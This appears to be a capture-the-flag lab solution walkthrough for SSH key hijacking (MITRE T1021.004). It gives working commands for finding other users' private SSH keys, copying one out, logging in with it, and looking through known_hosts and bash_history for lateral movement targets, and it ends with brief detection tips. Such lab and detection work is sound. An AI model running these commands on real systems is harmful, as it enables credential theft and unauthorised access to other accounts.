# T1021.004 – SSH Key Hijacking | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1021.004

## Step 1 – Find SSH Keys
```bash
# Check known locations for SSH private keys:
sudo find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
sudo find /root -name "id_rsa" 2>/dev/null
sudo find / -name "*.pem" -path "*/.ssh/*" 2>/dev/null
# Found: /home/svc_account/.ssh/id_rsa
```

## Step 2 – Steal the Key
```bash
sudo cat /home/svc_account/.ssh/id_rsa > /tmp/stolen_key
chmod 600 /tmp/stolen_key
# Verify it's a valid private key:
head -2 /tmp/stolen_key
# -----BEGIN RSA PRIVATE KEY-----
```

## Step 3 – Authenticate with Stolen Key
```bash
ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no svc_account@localhost
# Authenticated! No password needed.
cat ~/.secret/flag.txt
# HACKTIFY{SSH_KEY_HIJACK_<hash>}
```

## Step 4 – Enumerate Reachable Hosts
```bash
# Check known_hosts for lateral movement targets:
cat /home/svc_account/.ssh/known_hosts
# bash_history may reveal hosts this account connects to:
sudo cat /home/svc_account/.bash_history | grep ssh
```

## Detection
- File access on `/home/*/.ssh/id_rsa` by non-owning user (auditd)
- SSH login from unusual source (same host = key stolen locally)
- Monitor `find` commands targeting `.ssh` directories
